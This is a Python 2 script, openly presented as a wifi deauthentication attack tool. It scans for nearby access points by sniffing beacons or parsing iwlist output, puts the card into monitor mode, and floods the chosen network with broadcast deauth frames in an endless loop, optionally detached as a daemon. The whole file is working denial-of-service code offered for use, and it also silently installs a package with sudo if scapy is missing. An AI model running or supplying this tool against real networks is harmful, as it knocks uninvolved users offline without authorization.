#!/usr/bin/env python
"""
Sends deauth packets to a wifi network which results network outage for connected devices.
"""
__author__ ="Veerendra Kakumanu"
__license__ = "Apache 2.0"
__version__ = "3.0"
__maintainer__ = "Veerendra Kakumanu"

import os
import sys
import re
import logging
import subprocess
import argparse
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    import scapy.all
except:
    print "\n'scapy' module not found. Installing..."
    os.system("sudo apt-get install python-scapy -y")
    import scapy.all
scapy.all.conf.verbose = False
wireless_file="/proc/net/wireless"
dev_file="/proc/net/dev"
packet_count=2000
patterns={"MAC Address" : 'Address:(.*)',
          "ESSID"       : 'ESSID:(.*)',
          "ID"          : '(.*) - Address'}
def banner():
    print "\n+---------------------------------------------------+"
    print "|Deauth v3.0                        		    |"
    print "|Coded by Veerendra Kakumanu                        |"
    print "|Blog: www.networkhop.wordpress.com 		    |"
    print "|https://github.com/veerendra2/wifi-deauth-attack   |"
    print "+---------------------------------------------------+\n\n"

def daemonize():
    if os.fork():
        os._exit(0)
    os.chdir("/")
    os.umask(022)
    os.setsid()
    os.umask(0)
    if os.fork():
        os._exit(0)
    stdin = open(os.devnull)
    stdout = open(os.devnull, 'w')
    os.dup2(stdin.fileno(), 0)
    os.dup2(stdout.fileno(), 1)
    os.dup2(stdout.fileno(), 2)
    stdin.close()
    stdout.close()
    os.umask(022)
    for fd in xrange(3, 1024):
        try:
            os.close(fd)
        except OSError:
            pass

def create_interface():
    iface=None
    try:
        with open(dev_file) as f:
            return re.findall(r'(mon[0-9]+|prism[0-9]+|wlan0mon)',f.read())[0]
    except:
        print "Monitoring interface not found. Attempting to start airmon-ng"
        try:
            with open(wireless_file) as f:
                iface=re.findall(r'(.*):',f.read())[0].strip()
        except:
            iface=raw_input("Wireless interface not found.\nPlease enter wireless interface name> ").strip()
        if os.system("airmon-ng start {} > /dev/null 2>&1".format(iface))!=0:
            print "\nairmon-ng not found. Please install aircrack-ng. RUN 'sudo apt-get install aircrack-ng -y'"
            exit(1)
        with open(dev_file) as f:
            return re.findall(r'(mon[0-9]+|prism[0-9]+|wlan0mon)',f.read())[0]

def spinner():
    while True:
        for cursor in '|/-\\':
            yield cursor
spin=spinner()
class sniffWifi(object):
    def __init__(self,mon,pktlimit):
        self.mon=mon
        self.ap_list = dict() #Key--> ssidcount, Value-->[MAC, SSID]
        self.ap_set=set()
        self.pktcount=0
        self.ssidcount=0
        self.pktlimit=pktlimit #Number of beacons should listen

    def packetHandler(self,pkt):
        self.pktcount+=1
        if pkt.haslayer(scapy.all.Dot11) and pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 not in self.ap_set:
            self.ssidcount+=1
            self.ap_set.add(pkt.addr2)
            self.ap_list.setdefault(str(self.ssidcount),[pkt.addr2,pkt.info])

    def stopFilter(self,x): #Stop the Sniffing if packet reachs the count
        sys.stdout.write("\b{}".format(next(spin)))
        sys.stdout.flush()
        if self.pktlimit < self.pktcount:
            return True
        else:
            return False

    def runSniff(self): #Sniffing Here!
        print "\nMonitoring wifi signals, it will take some time. Please wait.....",
        scapy.all.sniff(iface=self.mon, prn = self.packetHandler, stop_filter=self.stopFilter)
        print "\n\n"
        return self.ap_list



def get_aplist():
    result=None
    ap=dict()
    for x in range(3): #Sometimes it command is not running
        if x==2:
            print "iwlist is not working?"
            exit(1)
        try:
            result=subprocess.check_output("iwlist wlan0 s",shell=True)
            break
        except:
            continue
    for name,pattern in patterns.items():
        patterns[name]=re.compile(pattern)
    for line in result.split("Cell"):
        if line and "Scan completed" not in line:
            mac=patterns["MAC Address"].findall(line)[0].strip()
            ssid=patterns["ESSID"].findall(line)[0].strip('"')
            ids=int(patterns["ID"].findall(line)[0].strip())
            ap.setdefault(ids,[mac,ssid])
    return ap

def send_deauth(mac,mon):
    pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac[0],addr3=mac[0])/scapy.all.Dot11Deauth()
    print "\nSending Deauthication Packets to -> "+mac[1]
    while True:
        sys.stdout.write("\b{}".format(next(spin)))
        sys.stdout.flush()
        scapy.all.sendp(pkt, iface=mon,count=1, inter=.2, verbose=0)

def render_ouput(ap):
    if not ap:
        print "Wifi hotspots not found near by you."
        exit(1)
    print "+".ljust(5,"-")+"+".ljust(28,"-")+"+".ljust(20,"-")+"+"
    print "| ID".ljust(5," ")+"|"+"     Wifi Hotspot Name     "+"|"+"    MAC Address    |"
    print "+".ljust(5,"-")+"+".ljust(28,"-")+"+".ljust(20,"-")+"+"
    for id, ssid in ap.items():
        print "|",str(id).ljust(3," ")+"|",ssid[1].ljust(26," ")+"|",ssid[0].ljust(17," ")+" |"
    print "+".ljust(5,"-")+"+".ljust(28,"-")+"+".ljust(20,"-")+"+"
    while 1:
        try:
            res=raw_input("\nChoose ID>>")
            if res in ap:
                break
        except: pass
        print "Invalid option. Please try again"
    return ap[res]

if __name__=='__main__':
    if not os.geteuid() == 0:
        print "[ERROR]".ljust(8," "),"Script must run with 'sudo'"
        print "For Help: sudo python deauth.py -h"
        exit(1)
    parser = argparse.ArgumentParser(description='Sends deauthentication packets to a wifi network which results network outage for connected devices.  [Coded by VEERENDRA KAKUMANU]')
    parser.add_argument('-d', action='store_true', dest='daemon', default=False ,help='Run as daemon')
    parser.add_argument('-c', action='store', dest='count',help='Stops the monitoring after this count reachs.By default it is 2000')
    parser.add_argument('-m', action='store', dest='mac',help='Sends deauth packets to this network')
    parser.add_argument('-v', action='version', version='%(prog)s 3.0')
    results=parser.parse_args()
    banner()
    if results.count:
        packet_count=int(results.count)
    mon=create_interface()
    if results.mac:
        if not re.search(r'(?:[0-9a-fA-F]:?){12}',results.mac.strip()):
            print "Incorrect MAC address format. Please check",results.mac.strip()
            exit(1)
        if results.daemon:
            print "\nRunning as daemon with pid",os.getpid()
            print "If you want to kill the process, run'pkill -9 -f deauth.py'"
            daemonize()
        send_deauth([results.mac.strip(),"Unknown"],mon)
    else:
        sniff=sniffWifi(mon,packet_count)
        wifi=render_ouput(sniff.runSniff())
        if results.daemon:
            print "\nRunning as daemon with pid",os.getpid()
            print "If you want to kill the process, run 'pkill -9 -f deauth.py'"
            daemonize()
        send_deauth(wifi,mon)
